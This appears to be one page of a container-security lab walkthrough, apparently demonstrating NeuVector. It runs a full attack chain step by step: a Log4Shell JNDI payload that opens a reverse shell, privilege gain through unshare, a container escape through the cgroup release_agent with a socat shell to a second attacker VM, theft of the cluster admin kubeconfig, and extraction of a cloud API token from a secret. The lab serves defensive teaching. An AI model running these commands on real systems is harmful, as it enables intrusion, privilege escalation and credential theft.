+++
title = "Run attack again"
weight = 17
+++

Ensure, that you have a fresh shell on both attacker01 and attacker02. Cancel running processes with Ctrl+C.

Then open nc on **attacker 01**

```ctr:
sudo nc -lvnp 443
```

And socat on **attacker02**

```ctr:
socat file:`tty`,raw,echo=0 tcp-listen:4445
```

We are going to run the attack again, to see how NeuVector behaves.

Execute the request to trigger the attack:

**Run the following commands on the victim01 VM.**

```ctr
curl http://sample-app.default.${vminfo:victim01:public_ip}.sslip.io/login -d "uname=test&password=invalid" -H 'User-Agent: ${jndi:ldap://${vminfo:attacker01:public_ip}:1389/a}'
```

The attacker01 VM now received a remote shell from the container.

**Run the following commands on the attacker01 VM.**

We can list the container filesystem

```ctr:
ls -la
```

or the running processes

```ctr:
ps auxf
```

Let's try to install kubectl into the container

```ctr:
curl -LO --insecure "https://dl.k8s.io/release/$(curl -L -s --insecure https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"; chmod +x kubectl; mv kubectl /usr/bin/
```

And access the Kubernetes API. This should create an error, because the Pod's ServiceAccount does not have any permissions to access the Kubernetes API:

```ctr:
kubectl get pods
```

Let's try something else and list the Linux capabilities of the container

```ctr:
capsh --print
```

Not that our container does not have `cap_sys_admin` capabilities.

Let's try to change this by exploiting a Kernel vulnerability:

```ctr:attacker01
unshare -UrmC bash
capsh --print
```

Now that we have `cap_sys_admin` capabilities. We can try to exploit another Kernel bug to break out of the container and create a second remote shell from the host system to the attacker02 VM.

Create a new RDMA cgroup

```ctr:
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```

Enables cgroup notifications on release of the "x" cgroup

```ctr:
echo 1 > /tmp/cgrp/x/notify_on_release
```

Get the path of the OverlayFS mount for our container

```ctr:
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
```

Set the release agent to execute `/{overlay_fs_host_path}/cmd` on the host (`/cmd` inside of the container) when the cgroup is released

```ctr:
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```

Create the command, which will run socat and create a remote shell to the attacker02 VM

```ctr:
echo '#!/bin/bash' > /cmd
echo "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${vminfo:attacker02:public_ip}:4445" >> /cmd
chmod a+x /cmd
```

Run `echo` in the cgroup, which will directly exit and trigger the release agent cmd (execute `/{overlay_fs_host_path}/cmd`):

```ctr:
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

Now we got a remote shell on the attacker02 VM where we are root directly on the victim01 host

**Run the following commands on the attacker02 VM.**

```ctr:
whoami
docker ps
```

Install kubectl

```ctr:
docker cp kubelet:/usr/local/bin/kubectl /usr/bin/
```

Get kubeconfig

```ctr:
kubectl --kubeconfig $(docker inspect kubelet --format '{{ range .Mounts }}{{ if eq .Destination "/etc/kubernetes" }}{{ .Source }}{{ end }}{{ end }}')/ssl/kubecfg-kube-node.yaml get configmap -n kube-system full-cluster-state -o json | jq -r .data.\"full-cluster-state\" | jq -r .currentState.certificatesBundle.\"kube-admin\".config | sed -e "/^[[:space:]]*server:/ s_:.*_: \"https://127.0.0.1:6443\"_" > kubeconfig_admin.yaml

export KUBECONFIG=$(pwd)/kubeconfig_admin.yaml
```

Now we are admin in the Kubernetes cluster

```ctr:
kubectl get pods -A
```

Get the cloud provider token

```ctr:
do_token=$(kubectl get secret -n kube-system digitalocean -o jsonpath="{.data.access-token}" | base64 --decode)
```

Install doctl

```ctr:
cd ~
wget https://github.com/digitalocean/doctl/releases/download/v1.94.0/doctl-1.94.0-linux-amd64.tar.gz
tar xf ~/doctl-1.94.0-linux-amd64.tar.gz
mv ~/doctl /usr/bin
```

Try to log in with the fake token (this will fail):

```ctr:
doctl auth init -t $do_token
```
